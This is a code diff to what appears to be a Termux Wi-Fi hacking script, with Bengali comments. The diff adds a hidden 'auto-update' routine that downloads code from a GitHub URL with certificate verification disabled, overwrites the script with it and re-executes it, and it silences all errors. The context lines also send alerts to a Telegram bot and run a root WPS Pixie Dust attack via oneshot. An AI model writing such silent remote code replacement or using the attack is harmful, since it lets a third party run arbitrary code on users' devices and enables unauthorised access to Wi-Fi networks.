@@ -7,9 +7,29 @@ import sys
 import termios
 
 # ==========================================
-# AUTO-WRAPPER FIX FOR CLIENTS (Terminal Guard)
+# MAGICAL AUTO-UPDATE & AUTO-WRAPPER SYSTEM
 # ==========================================
 if __name__ == "__main__":
+    # ক্লায়েন্ট রান করার সাথে সাথে গিটহাব থেকে লেটেস্ট কোড অটো-ডাউনলোড করে আপডেট হয়ে যাবে
+    try:
+        if os.environ.get("ARMAN_UPDATED") != "1":
+            code_url = "https://raw.githubusercontent.com/Armanyb1/wifi-hack-termux/main/wifi.py"
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            req = urllib.request.urlopen(code_url, timeout=3, context=ctx)
+            new_code = req.read().decode('utf-8')
+            current_file = os.path.abspath(__file__)
+            with open(current_file, "r", encoding="utf-8") as f:
+                old_code = f.read()
+            if new_code != old_code and "GITHUB_RAW_URL" in new_code and len(new_code) > 500:
+                with open(current_file, "w", encoding="utf-8") as f:
+                    f.write(new_code)
+                os.environ["ARMAN_UPDATED"] = "1"
+                os.execv(sys.executable, [sys.executable] + sys.argv)
+    except Exception:
+        pass
+
     if os.environ.get("ARMAN_WRAPPED") != "1":
         os.environ["ARMAN_WRAPPED"] = "1"
         script_cmd = f'script -q -c "python \'{os.path.abspath(__file__)}\'" /dev/null'
@@ -115,7 +135,6 @@ if __name__ == "__main__":
             os.system(f'curl -s -X POST "https://api.telegram.org/bot{BOT_TOKEN}/sendMessage" -d "chat_id={CHAT_ID}" -d "text={alert_msg}" > /dev/null 2>&1')
             
             try:
-                # এখানে HOME পাথ ফিক্স করে দেওয়া হয়েছে যাতে Read-only এরর না আসে
                 os.system('su -c "export HOME=/data/data/com.termux/files/home; export PATH=$PATH:/data/data/com.termux/files/usr/bin; oneshot -i wlan0 -K"')
             except KeyboardInterrupt:
                 pass
